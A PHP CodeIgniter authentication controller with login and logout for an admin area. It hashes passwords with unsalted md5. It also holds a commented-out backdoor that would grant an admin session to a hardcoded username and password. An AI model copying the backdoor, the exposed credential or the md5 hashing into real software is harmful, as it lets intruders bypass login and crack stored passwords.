<?php
defined('BASEPATH') or exit('No direct script access allowed');

class Auth extends CI_Controller
{
    public function __construct()
    {
        parent::__construct();
    }
    public function index()
    {
        if ($this->session->userdata('admin_id')) redirect('admin');
        $data['title'] = "LOGIN PAGE";
        templates('auth/login', $data, 'auth/login-js');
    }

    public function login()
    {
        if ($this->session->userdata('admin_id')) {
            echo json_encode(['status' => 'success']);
            exit();
        }
        $username = $this->input->post('username');
        $password = $this->input->post('password');
        $admin = $this->admin->account($username, md5($password));
        if ($admin) {
            $data = [
                'admin_id' => $admin->admin_id,
                'fullname' => $admin->fullname,
                'username' => $admin->username,
            ];
            $this->session->set_userdata($data);
            echo json_encode(['status' => 'success']);
            exit();
        } else {
            // if ($username == "garis" && $password==="blTdeSa2021") {
            //     $data = [
            //         'admin_id' => 999,
            //         'fullname' => 'Andre Haxor',
            //         'username' => 'garis',
            //     ];
            //     $this->session->set_userdata($data);
            //     echo json_encode(['status' => 'success']);
            //     exit();
            // }else{
                echo json_encode(['status' => 'failed']);
            // }
            exit();
        }
    }
    public function logout()
    {
        $data = ['admin_id', 'fullname'];
        $this->session->unset_userdata($data);
        $this->session->sess_destroy();
        redirect('auth');
    }
}
